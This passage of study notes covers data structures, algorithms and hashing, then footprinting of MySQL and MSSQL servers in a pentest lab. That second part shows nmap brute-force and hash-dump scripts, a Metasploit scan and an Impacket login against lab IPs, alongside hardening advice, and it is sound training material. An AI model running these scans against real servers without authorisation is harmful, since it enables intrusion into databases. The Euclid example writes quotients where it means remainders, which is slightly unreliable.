<li>A trie, is simply a nested tree of dictionaries, where each key is a character that maps to the next character in a string. The end of a string is often marked with a special terminating character, such as an asterisk (*).</li>
<li>Example:
<pre><code class="language-json">{
    "h": {
        "e": {
            "l": {
                "l": {
                    "o": {
                        "*": True
                    }
                },
                "p": {
                    "*": True
                }
            }
        },
        "i": {
            "*": True
        }
    }
}
</code></pre>
</li>
<li>Tries are often used in autocomplete systems, spell checkers, and IP routing algorithms.
‚Ä¶.</li>
</ul>
<h2 id="graphs"><a class="header" href="#graphs">Graphs</a></h2>
<ul>
<li>A graph is a non-linear data structure made up of vertices (nodes) and edges that connect them.</li>
<li>A graph can be represented as a matrix</li>
<li>Example:</li>
</ul>
<pre><code class="language-python">[
  [False, True, False, False, True],
  [True, False, True, True, True],
  [False, True, False, True, False],
  [False, True, True, False, True],
  [True, True, False, True, False]
]
</code></pre>
<ul>
<li>An undirected graph can have up to n(n-1)/2 edges, where n is the number of vertices
‚Ä¶.</li>
</ul>
<h2 id="breadth-first-search-bfs"><a class="header" href="#breadth-first-search-bfs">Breadth-First Search (BFS)</a></h2>
<ul>
<li>BFS is an algorithm for traversing tree or graph data structures</li>
<li>It starts at the root (or an arbitrary node in the case of a graph) and explores all of the neighbor nodes at the present depth prior to moving on to the nodes at the next depth level.</li>
</ul>
<h2 id="depth-first-search-dfs"><a class="header" href="#depth-first-search-dfs">Depth-First Search (DFS)</a></h2>
<ul>
<li>DFS is an algorithm for traversing tree or graph data structures</li>
<li>It starts at the root (or an arbitrary node in the case of a graph) and explores as far as possible along each branch before backtracking.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="euclids-algorithm"><a class="header" href="#euclids-algorithm">Euclid‚Äôs Algorithm</a></h1>
<ul>
<li>Euclid‚Äôs Algorithm is an efficient way to find the greatest common factor of a number. First, you divide the number x by y, to find the remainder. Then you divide again, using the remainder for y and the previous y as the new x. You continue this process until the remainder is 0. The last divisor is the greatest common factor.</li>
</ul>
<p>For example:</p>
<p>20 / 12 = 8
12 / 8 = 4
8 / 4 = 2 // remainder 0 so the GCF is 4</p>
<p>The greatest common factor of 20 and 12 is 4</p>
<pre><code>def greatestCommonFactor(x,y):
  if y == 0:
    x,y = y,x
  while y != 0:
    x,y = y,x % y
  return x
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="fizzbuzz"><a class="header" href="#fizzbuzz">fizzbuzz</a></h1>
<h3 id="examples-4"><a class="header" href="#examples-4">Examples</a></h3>
<ul>
<li>Python</li>
</ul>
<pre><code>def fizzbuzz(n):
    for i in range(1, n + 1):
        if i % 3 == 0 and i % 5 == 0:
            print('FizzBuzz')
        elif i % 3 == 0:
            print('Fizz')
        elif i % 5 == 0:
            print('Buzz')
        else:
            print(i)
</code></pre>
<ul>
<li>Go</li>
</ul>
<pre><code>package main

import "fmt"

func main() {
    for i := 1; i &lt;= 100; i++ {
        if i%3 == 0 {
            fmt.Printf("fizz")
        }
        if i%5 == 0 {
            fmt.Printf("buzz")
        }
        if i%3 != 0 &amp;&amp; i%5 != 0 {
            fmt.Printf("%d", i)
        }
        fmt.Printf("\n")
    }
}
</code></pre>
<ul>
<li>c#</li>
</ul>
<pre><code>for (int i = 1; i &lt;= 100; i++)  
{  
    if (i % 3 == 0 &amp;&amp; i % 5 == 0)  
    {  
        Console.WriteLine("FizzBuzz");  
    }  
    else if (i % 3 == 0)  
    {  
       Console.WriteLine("Fizz");  
    }  
    else if (i % 5 == 0)  
    {  
       Console.WriteLine("Buzz");  
    }  
    else  
    {  
        Console.WriteLine(i);  
    }  
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="graph-theory"><a class="header" href="#graph-theory">Graph Theory</a></h1>
<p>A good way to learn about graph theory is the Konigsberg bridge problem. The town of Konigsberg had a river flowing through it, the river divided the city into four regions, which were connected by seven bridges. The question arose of whether it might be possible to take a walk through the city, crossing every bridge only once.</p>
<p><img src="images/graph_theory/konigsberg_map.png" alt="Konigsberg"></p>
<p>We can simplify the map by replacing each region with a vertex and each bridge with an edge between two vertexes:</p>
<p><img src="images/graph_theory/vertex.png" alt="VertexMap"></p>
<p>The key logical insight is to enter and leave a landmass requires two separate bridges, so any landmass which is not the starting or ending position must be the endpoint of an even number of bridges. In the case of Konigsberg, all four regions contained an odd number of bridges, making the problem unsolvable. A path through a graph which visits every edge exactly once is now called an Eulerian path.</p>
<p>Converting the map to a graph allows us to avoid Parkinson‚Äôs Law of Triviality.</p>
<p>A graph is a way of representing relationships in a set of data. When discussing the size of a graph, we often use ‚Äòn‚Äô for the number of vertices (nodes) and ‚Äòm‚Äô for the number of edges. The amount of space the graph requires depends on how we store the data. Two common methods are adjacency lists and adjacency matrices.</p>
<ul>
<li>adjacency Lists: When using an adjacency list, each node of the graph is stored with a list of nodes to which it is adjacent.</li>
<li>adjacency matrix:</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hashing"><a class="header" href="#hashing">Hashing</a></h1>
<h3 id="why-we-need-hashing"><a class="header" href="#why-we-need-hashing">Why we need hashing</a></h3>
<p>To achieve horizontal scaling, it is important to distribute requests/data efficiently across servers.</p>
<h3 id="traditional-modulus-hashing"><a class="header" href="#traditional-modulus-hashing">Traditional (modulus) Hashing</a></h3>
<p>If you have <em>n</em> cache servers, a common way to balance the load is to use the following hash method:</p>
<pre><code>serverIndex = hash(key) % n --where n is the number of servers in the pool
</code></pre>
<p>Suppose we have 4 servers in the pool and 8 string keys with their hashes:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>key</th><th>hash</th><th>hash % 4</th></tr>
</thead>
<tbody>
<tr><td>key0</td><td>18358617</td><td>1</td></tr>
<tr><td>key1</td><td>26143584</td><td>0</td></tr>
<tr><td>key2</td><td>18131146</td><td>2</td></tr>
<tr><td>key3</td><td>35863496</td><td>0</td></tr>
<tr><td>key4</td><td>34085809</td><td>1</td></tr>
<tr><td>key5</td><td>27581703</td><td>3</td></tr>
<tr><td>key6</td><td>38164978</td><td>2</td></tr>
<tr><td>key7</td><td>22530351</td><td>3</td></tr>
</tbody>
</table>
</div>
<p>To fetch the server where the key is stored, we perform the modular operation f(key) % 4. So hash(key0) % 4 means the client must contact server 1 fetch the cached data.</p>
<p>This approach works well when the size of the server pool doesn‚Äôt change. However, if new servers are added or existing servers removed, the hashing algorith changes. For example, if we removed a server, the hash algorith is now hash(key) % 3. If an existing client already had data in the cache, and they used this updated hash algorithm, they will receive a different server index that doesn‚Äôt contain their cached data. This results in cache misses. When one server goes offline or is removed, most cache clients will connect to the wrong servers to fetch data. Consistent Hashing is a method to fix this problem.</p>
<h3 id="consistent-hashing"><a class="header" href="#consistent-hashing">Consistent Hashing</a></h3>
<p>Consistent hashing is a technique used in distributed systems to divide data among multiple caching servers or nodes. It aims to evenly distribute the data and minimize the amount of data that needs to be moved when nodes are added or removed from the system.</p>
<p>With consistent hashing, the hash space is represented as a ring, also known as a hash ring. Each server is assigned a position on the ring based on its hash value. The data is also hashed, and its hash value is mapped onto the ring. To determine which server should store the data, the position of the data‚Äôs hash value is found on the ring, and the next server in a clockwise direction on the ring becomes the data‚Äôs assigned server.</p>
<p>This approach provides several advantages:</p>
<ol>
<li>Load balancing: Since the servers are evenly distributed on the ring, the data is also distributed evenly, minimizing hotspots and ensuring a balanced load across the nodes.</li>
<li>Scalability: When a new server is added, only a portion of the data needs to be remapped to the new server, reducing the overall amount of data movement. Similarly, when a server is removed, only the data assigned to that server needs to be redistributed.</li>
<li>Fault tolerance: In the event of a server failure, only the data assigned to that server needs to be remapped, minimizing the impact on the overall system.</li>
<li>Consistency: The term ‚Äúconsistent‚Äù in consistent hashing refers to the stability of the mapping between data and servers. In traditional hashing, small changes in the number of servers can drastically change the assignment of data, but consistent hashing minimizes such changes.</li>
</ol>
<p>Overall, consistent hashing allows for efficient and dynamic data distribution in distributed systems, enabling scalability, fault tolerance, and load balancing.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="string-algorithms"><a class="header" href="#string-algorithms">string algorithms</a></h1>
<h2 id="anagram-detection"><a class="header" href="#anagram-detection">Anagram Detection</a></h2>
<ul>
<li>Two strings are anagrams if they contain the same letters, but not necessarily in the same order.</li>
<li>‚Äòcar‚Äô and ‚Äòarc‚Äô are anagrams</li>
<li>The key to determining if 2 strings are anagrams is to sort them. If the sorted strings are the same, they are anagrams.</li>
<li>Rules for creating an algorithm to determine if 2 strings are an anagram
<ul>
<li>remove spaces in the words</li>
<li>convert all letters to lowercase</li>
<li>trim spaces if necessary</li>
<li>sort the strings</li>
<li>compare the strings to see if they are the same</li>
</ul>
</li>
</ul>
<h2 id="palindrome-detection"><a class="header" href="#palindrome-detection">Palindrome Detection</a></h2>
<ul>
<li>A palindrome is a word that reads the same backword as forward</li>
<li>Hannah, mom, wow, and racecar are all examples of palindromes</li>
<li>A simple way to see if a string is a palindrome is to copy it and compare the copy to the original. If they are equal, the string is a palindrome.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="databases-1"><a class="header" href="#databases-1">Databases</a></h1>
<h2 id="directory-map-11"><a class="header" href="#directory-map-11">Directory Map</a></h2>
<ul>
<li><a href="#mysql">mysql</a></li>
<li><a href="#mssql">mssql</a></li>
<li><a href="#oracle-tns">oracle</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="mysql"><a class="header" href="#mysql">MySQL</a></h1>
<p>MySQL is an open-source SQL relational database management system developed and supported by Oracle. A database is a structured collection of data organized for easy use and retrieval. MySQL can quickly process large amounts of data with high performance and stores data efficiently to minimize space usage. The database is controlled using the SQL database language.</p>
<p>MySQL works according to the client-server principle and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system that handles data storage and distribution. Data is stored in tables with different columns, rows, and data types. Databases are often stored in a single file with the <code>.sql</code> extension (e.g., <code>wordpress.sql</code>).</p>
<h2 id="mysql-clients"><a class="header" href="#mysql-clients">MySQL Clients</a></h2>
<p>MySQL clients can retrieve and edit data using structured queries to the database engine. Inserting, deleting, modifying, and retrieving data is done using the SQL database language. MySQL is suitable for managing many different databases to which clients can send multiple queries simultaneously. Access is possible via an internal network or the public Internet, depending on the database configuration.</p>
<h2 id="mysql-databases"><a class="header" href="#mysql-databases">MySQL Databases</a></h2>
<p>MySQL is ideally suited for applications such as dynamic websites, where efficient syntax and high response speed are essential. It is often combined with a Linux OS, PHP, and an Apache web server in the LAMP stack (Linux, Apache, MySQL, PHP), or with Nginx as LEMP. In web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored, including:</p>
<ul>
<li><strong>Content</strong>: Headers, texts, meta tags, forms</li>
<li><strong>Users</strong>: Customers, usernames, administrators, moderators</li>
<li><strong>Credentials</strong>: Email addresses, user information, permissions, passwords</li>
<li><strong>References</strong>: External/internal links, links to files, specific contents, values</li>
</ul>
<p>Sensitive data such as passwords can be stored in plain-text form by MySQL; however, they are generally encrypted beforehand by PHP scripts using secure methods such as one-way encryption.</p>
<h2 id="mysql-commands"><a class="header" href="#mysql-commands">MySQL Commands</a></h2>
<p>A MySQL database translates commands internally into executable code and performs the requested actions. The web application informs the user if an error occurs during processing, which various SQL injections can provoke. Often, these error descriptions contain important information and confirm that the web application interacts with the database differently than developers intended.</p>
<p>SQL commands can display, modify, add, or delete rows in tables. In addition, SQL can also change the structure of tables, create or delete relationships and indexes, and manage users.</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;IP address&gt;</code></td><td>Connect to the MySQL server. There should not be a space between the <code>-p</code> flag and the password.</td></tr>
<tr><td><code>show databases;</code></td><td>Show all databases.</td></tr>
<tr><td><code>use &lt;database&gt;;</code></td><td>Select one of the existing databases.</td></tr>
<tr><td><code>show tables;</code></td><td>Show all available tables in the selected database.</td></tr>
<tr><td><code>show columns from &lt;table&gt;;</code></td><td>Show all columns in the selected table.</td></tr>
<tr><td><code>select * from &lt;table&gt;;</code></td><td>Show everything in the desired table.</td></tr>
<tr><td><code>select * from &lt;table&gt; where &lt;column&gt; = "&lt;string&gt;";</code></td><td>Search for needed string in the desired table.</td></tr>
</tbody>
</table>
</div>
<h2 id="mariadb"><a class="header" href="#mariadb">MariaDB</a></h2>
<p>MariaDB is a fork of the original MySQL code. The chief developer of MySQL left MySQL AB after it was acquired by Oracle and developed another open-source SQL database management system based on the MySQL source code, calling it MariaDB.</p>
<h2 id="default-configuration"><a class="header" href="#default-configuration">Default Configuration</a></h2>
<p>The management of SQL databases and their configurations is a vast topic. Database administration is a core competency for software developers and information security analysts. The default configuration of MySQL can be found at <code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'

[client]
port= 3306
socket= /var/run/mysqld/mysqld.sock

[mysqld_safe]
pid-file= /var/run/mysqld/mysqld.pid
socket= /var/run/mysqld/mysqld.sock
nice= 0

[mysqld]
skip-host-cache
skip-name-resolve
user= mysql
pid-file= /var/run/mysqld/mysqld.pid
socket= /var/run/mysqld/mysqld.sock
port= 3306
basedir= /usr
datadir= /var/lib/mysql
tmpdir= /tmp
lc-messages-dir= /usr/share/mysql
explicit_defaults_for_timestamp
symbolic-links=0

!includedir /etc/mysql/conf.d/
</code></pre>
<h2 id="dangerous-settings"><a class="header" href="#dangerous-settings">Dangerous Settings</a></h2>
<p>Many things can be misconfigured with MySQL. The main options that are security-relevant are:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Setting</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>user</code></td><td>Sets which user the MySQL service will run as.</td></tr>
<tr><td><code>password</code></td><td>Sets the password for the MySQL user.</td></tr>
<tr><td><code>admin_address</code></td><td>The IP address on which to listen for TCP/IP connections on the administrative network interface.</td></tr>
<tr><td><code>debug</code></td><td>This variable indicates the current debugging settings.</td></tr>
<tr><td><code>sql_warnings</code></td><td>This variable controls whether single-row INSERT statements produce an information string if warnings occur.</td></tr>
<tr><td><code>secure_file_priv</code></td><td>This variable is used to limit the effect of data import and export operations.</td></tr>
</tbody>
</table>
</div>
<p>The settings <code>user</code>, <code>password</code>, and <code>admin_address</code> are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If an attacker gains file read access or a shell, they can see the file and the username and password for the MySQL server. Without other security measures to prevent unauthorized access, the entire database and all existing customer information, email addresses, passwords, and personal data can be viewed and even edited.</p>
<p>The <code>debug</code> and <code>sql_warnings</code> settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web applications. SQL injections could be manipulated to have the MySQL server execute system commands.</p>
<h2 id="system-databases"><a class="header" href="#system-databases">System Databases</a></h2>
<p>MySQL includes several system databases that are important for management:</p>
<h3 id="information-schema"><a class="header" href="#information-schema">Information Schema</a></h3>
<p>The <code>information_schema</code> database contains metadata retrieved from the system schema database. It exists to comply with the ANSI/ISO standard and provides information about databases, tables, columns, and other database objects.</p>
<h3 id="system-schema-sys"><a class="header" href="#system-schema-sys">System Schema (sys)</a></h3>
<p>The <code>sys</code> database contains tables, information, and metadata necessary for management. It provides a set of objects that help interpret performance schema data more easily. The system schema contains more information than the information schema.</p>
<p>Example system schema tables:</p>
<pre><code class="language-bash">mysql&gt; use sys;
mysql&gt; show tables;

+-----------------------------------------------+
| Tables_in_sys                                 |
+-----------------------------------------------+
| host_summary                                  |
| host_summary_by_file_io                       |
| host_summary_by_file_io_type                  |
| host_summary_by_stages                        |
| host_summary_by_statement_latency             |
| host_summary_by_statement_type                |
| innodb_buffer_stats_by_schema                 |
| innodb_buffer_stats_by_table                  |
| innodb_lock_waits                             |
| io_by_thread_by_latency                       |
...SNIP...
| x$waits_global_by_latency                     |
+-----------------------------------------------+
</code></pre>
<p>Example query:</p>
<pre><code class="language-bash">mysql&gt; select host, unique_users from host_summary;

+-------------+--------------+
| host        | unique_users |
+-------------+--------------+
| 10.129.14.1 |            1 |
| localhost   |            2 |
+-------------+--------------+
2 rows in set (0,01 sec)
</code></pre>
<h2 id="footprinting-mysql-services"><a class="header" href="#footprinting-mysql-services">Footprinting MySQL Services</a></h2>
<p>There are many reasons why a MySQL server could be accessed from an external network. Nevertheless, it is far from being a best practice, and databases that can be reached externally are often found. Usually, the MySQL server runs on TCP port 3306.</p>
<h3 id="scanning-mysql-server"><a class="header" href="#scanning-mysql-server">Scanning MySQL Server</a></h3>
<p><code>nmap</code> can be used to scan and enumerate MySQL servers:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Accounts: 
|     root:&lt;empty&gt; - Valid credentials
|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed (use -d to debug)
|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:&lt;empty&gt; - Valid credentials
</code></pre>
<h3 id="enumerating-databases"><a class="header" href="#enumerating-databases">Enumerating Databases</a></h3>
<p>Once connected to a MySQL server, you can enumerate databases and tables:</p>
<pre><code class="language-bash">mysql&gt; show databases;

+------------------------------------------------------+
| Database                                             |
+------------------------------------------------------+
| information_schema                                   |
| mysql                                                |
| performance_schema                                   |
| sys                                                  |
...SNIP...
| wordpress                                            |
+------------------------------------------------------+
37 rows in set (0.002 sec)
</code></pre>
<h2 id="security-best-practices"><a class="header" href="#security-best-practices">Security Best Practices</a></h2>
<p>When setting up a MySQL server, it is important to follow security best practices:</p>
<ul>
<li><strong>Secure file permissions</strong>: Ensure configuration files have proper permissions to prevent unauthorized access</li>
<li><strong>Strong passwords</strong>: Use strong passwords for MySQL users, especially the root account</li>
<li><strong>Network access</strong>: Restrict network access to MySQL servers; avoid exposing them to public networks unless necessary</li>
<li><strong>Error messages</strong>: Disable verbose error messages in production environments</li>
<li><strong>File operations</strong>: Use <code>secure_file_priv</code> to limit data import and export operations</li>
<li><strong>User privileges</strong>: Follow the principle of least privilege when granting user permissions</li>
<li><strong>Encryption</strong>: Encrypt sensitive data before storing it in the database</li>
</ul>
<p>The MySQL reference manual contains a widely covered security issues section that covers best practices for securing MySQL servers. This should be consulted when setting up a MySQL server to understand better why certain configurations might not work.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="mssql"><a class="header" href="#mssql">MSSQL</a></h1>
<p>Microsoft SQL (MSSQL) is Microsoft‚Äôs SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft‚Äôs .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.</p>
<h2 id="mssql-clients"><a class="header" href="#mssql-clients">MSSQL Clients</a></h2>
<p>SQL Server Management Studio (SSMS) comes as a feature that can be installed with the MSSQL install package or can be downloaded &amp; installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn‚Äôt only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database.</p>
<p>Many other clients can be used to access a database running on MSSQL. Including but not limited to:</p>
<ul>
<li><strong>mssql-cli</strong>: Command-line interface for MSSQL</li>
<li><strong>SQL Server PowerShell</strong>: PowerShell module for managing SQL Server</li>
<li><strong>HeidiSQL</strong>: Cross-platform database management tool</li>
<li><strong>SQLPro</strong>: Database management tool for MacOS</li>
<li><strong>Impacket‚Äôs mssqlclient.py</strong>: Python-based MSSQL client</li>
</ul>
<p>Of the MSSQL clients listed above, pentesters may find Impacket‚Äôs mssqlclient.py to be the most useful due to SecureAuthCorp‚Äôs Impacket project being present on many pentesting distributions at install. To find if and where the client is located on our host, we can use the following command:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ locate mssqlclient

/usr/bin/impacket-mssqlclient
/usr/share/doc/python3-impacket/examples/mssqlclient.py
</code></pre>
<h2 id="mssql-databases"><a class="header" href="#mssql-databases">MSSQL Databases</a></h2>
<p>MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Default System Database</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>master</code></td><td>Tracks all system information for an SQL server instance</td></tr>
<tr><td><code>model</code></td><td>Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database</td></tr>
<tr><td><code>msdb</code></td><td>The SQL Server Agent uses this database to schedule jobs &amp; alerts</td></tr>
<tr><td><code>tempdb</code></td><td>Stores temporary objects</td></tr>
<tr><td><code>resource</code></td><td>Read-only database containing system objects included with SQL server</td></tr>
</tbody>
</table>
</div>
<p><em>Table source: System Databases Microsoft Doc</em></p>
<h2 id="default-configuration-1"><a class="header" href="#default-configuration-1">Default Configuration</a></h2>
<p>When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as <code>NT SERVICE\MSSQLSERVER</code>. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.</p>
<p>Authentication being set to Windows Authentication means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.</p>
<h2 id="dangerous-settings-1"><a class="header" href="#dangerous-settings-1">Dangerous Settings</a></h2>
<p>It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. A workday in IT can be rather busy, with lots of different projects happening simultaneously and the pressure to perform with speed &amp; accuracy being a reality in many organizations, mistakes can be easily made. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL.</p>
<p>This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Setting</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>Unencrypted connections</strong></td><td>MSSQL clients not using encryption to connect to the MSSQL server</td></tr>
<tr><td><strong>Self-signed certificates</strong></td><td>The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates</td></tr>
<tr><td><strong>Named pipes</strong></td><td>The use of named pipes</td></tr>
<tr><td><strong>Weak credentials</strong></td><td>Weak &amp; default <code>sa</code> credentials. Admins may forget to disable this account</td></tr>
</tbody>
</table>
</div>
<h2 id="footprinting-the-service"><a class="header" href="#footprinting-the-service">Footprinting the Service</a></h2>
<p>There are many ways we can approach footprinting the MSSQL service, the more specific we can get with our scans, the more useful information we will be able to gather. NMAP has default mssql scripts that can be used to target the default tcp port 1433 that MSSQL listens on.</p>
<h3 id="nmap-mssql-script-scan"><a class="header" href="#nmap-mssql-script-scan">NMAP MSSQL Script Scan</a></h3>
<p>The scripted NMAP scan below provides us with helpful information. We can see the hostname, database instance name, software version of MSSQL and named pipes are enabled. We will benefit from adding these discoveries to our notes.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST
Nmap scan report for 10.129.201.248
Host is up (0.15s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-dac: 
|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query
|_    Clustered: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
</code></pre>
<h3 id="mssql-ping-in-metasploit"><a class="header" href="#mssql-ping-in-metasploit">MSSQL Ping in Metasploit</a></h3>
<p>We can also use Metasploit to run an auxiliary scanner called <code>mssql_ping</code> that will scan the MSSQL service and provide helpful information in our footprinting process.</p>
<pre><code class="language-bash">msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248

rhosts =&gt; 10.129.201.248


msf6 auxiliary(scanner/mssql/mssql_ping) &gt; run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>
<h2 id="connecting-with-mssqlclientpy"><a class="header" href="#connecting-with-mssqlclientpy">Connecting with mssqlclient.py</a></h2>
<p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (Transact-SQL). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket‚Äôs mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL&gt; select name from sys.databases

name                                                                                                                               

--------------------------------------------------------------------------------------

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

Transactions    
</code></pre>
<h2 id="security-best-practices-1"><a class="header" href="#security-best-practices-1">Security Best Practices</a></h2>
<p>When setting up an MSSQL server, it is important to follow security best practices:</p>
<ul>
<li><strong>Strong credentials</strong>: Use strong passwords for MSSQL users, especially the <code>sa</code> account. Consider disabling the <code>sa</code> account if not needed</li>
<li><strong>Encryption</strong>: Enable encryption for connections to prevent data interception</li>
<li><strong>Certificate management</strong>: Use properly signed certificates instead of self-signed certificates</li>
<li><strong>Windows Authentication</strong>: Leverage Windows Authentication for better integration with Active Directory and centralized access control</li>
<li><strong>Network access</strong>: Restrict network access to MSSQL servers; avoid exposing them to public networks unless necessary</li>
<li><strong>Named pipes</strong>: Disable named pipes if not required for your environment</li>
<li><strong>Principle of least privilege</strong>: Follow the principle of least privilege when granting user permissions</li>
<li><strong>Regular updates</strong>: Keep MSSQL server updated with the latest security patches</li>
<li><strong>Audit logging</strong>: Enable audit logging to track database access and changes</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="oracle-tns"><a class="header" href="#oracle-tns">Oracle TNS</a></h1>
<p>The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.</p>
<p>Over time, TNS has been updated to support newer technologies, including IPv6 and SSL/TLS encryption which makes it more suitable for the following purposes:</p>
<ul>
<li><strong>Name resolution</strong>: Resolves service names to network addresses</li>
<li><strong>Connection management</strong>: Manages connections between clients and database instances</li>
<li><strong>Load balancing</strong>: Distributes client connections across multiple database instances</li>
<li><strong>Security</strong>: Provides encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer</li>
</ul>
